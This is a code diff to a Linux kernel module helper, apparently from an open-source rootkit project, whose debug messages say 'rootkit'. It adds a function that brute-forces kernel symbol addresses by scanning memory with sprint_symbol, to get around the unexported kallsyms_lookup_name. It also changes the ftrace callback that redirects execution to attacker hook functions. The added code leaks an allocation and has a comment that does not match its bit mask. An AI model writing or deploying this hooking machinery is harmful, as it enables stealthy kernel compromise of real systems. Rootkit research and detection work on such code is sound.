@@ -3,8 +3,7 @@
  * Author: Harvey Phillips (xcellerator@gmx.com)
  * License: GPL
  * */
-#include <linux/kernel.h>
-#include <linux/kallsyms.h>
+
 #include <linux/ftrace.h>
 #include <linux/linkage.h>
 #include <linux/slab.h>
@@ -55,22 +54,88 @@ struct ftrace_hook {
     struct ftrace_ops ops;
 };
 
+unsigned long kaddr_lookup_name(const char *fname_raw)
+{
+    int i;
+    unsigned long kaddr;
+    char *fname_lookup, *fname;
+
+    fname_lookup = kzalloc(NAME_MAX, GFP_KERNEL);
+    if (!fname_lookup)
+        return 0;
+
+    fname = kzalloc(strlen(fname_raw)+4, GFP_KERNEL);
+    if (!fname)
+        return 0;
+
+    /*
+     * We have to add "+0x0" to the end of our function name
+     * because that's the format that sprint_symbol() returns
+     * to us. If we don't do this, then our search can stop
+     * prematurely and give us the wrong function address!
+     */
+    strcpy(fname, fname_raw);
+    strcat(fname, "+0x0");
+
+    /*
+     * Get the kernel base address:
+     * sprint_symbol() is less than 0x100000 from the start of the kernel, so
+     * we can just AND-out the last 3 bytes from it's address to the the base
+     * address.
+     * There might be a better symbol-name to use?
+     */
+    kaddr = (unsigned long) &sprint_symbol;
+    kaddr &= 0xffffffffff000000;
+
+    /*
+     * All the syscalls (and all interesting kernel functions I've seen so far)
+     * are within the first 0x100000 bytes of the base address. However, the kernel
+     * functions are all aligned so that the final nibble is 0x0, so we only
+     * have to check every 16th address.
+     */
+    for ( i = 0x0 ; i < 0x100000 ; i++ )
+    {
+        /*
+         * Lookup the name ascribed to the current kernel address
+         */
+        sprint_symbol(fname_lookup, kaddr);
+
+        /*
+         * Compare the looked-up name to the one we want
+         */
+        if ( strncmp(fname_lookup, fname, strlen(fname)) == 0 )
+        {
+            /*
+             * Clean up and return the found address
+             */
+            kfree(fname_lookup);
+            return kaddr;
+        }
+        /*
+         * Jump 16 addresses to next possible address
+         */
+        kaddr += 0x10;
+    }
+    /*
+     * We didn't find the name, so clean up and return 0
+     */
+    kfree(fname_lookup);
+    return 0;
+}
 /* Ftrace needs to know the address of the original function that we
  * are going to hook. As before, we just use kallsyms_lookup_name()
  * to find the address in kernel memory.
  * */
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
 {
-    // new method
-    kln_p kln = get_kln_p();
-    if (kln == NULL) return -1;
+    hook->address = kaddr_lookup_name(hook->name);
 
-    hook->address = kln(hook->name);
-
-    if (!hook->address) {
+    if (!hook->address)
+    {
         printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
         return -ENOENT;
     }
+
 #if USE_FENTRY_OFFSET
     *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
 #else
@@ -81,18 +146,15 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 }
 
 /* See comment below within fh_install_hook() */
-
-static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
-		struct ftrace_ops *ops, struct ftrace_regs *fregs)
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
 {
-	struct pt_regs *regs = ftrace_get_regs(fregs);
-	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
 #if USE_FENTRY_OFFSET
-	regs->ip = (unsigned long)hook->function;
+    regs->ip = (unsigned long) hook->function;
 #else
-	if (!within_module(parent_ip, THIS_MODULE))
-		regs->ip = (unsigned long)hook->function;
+    if(!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long) hook->function;
 #endif
 }
 
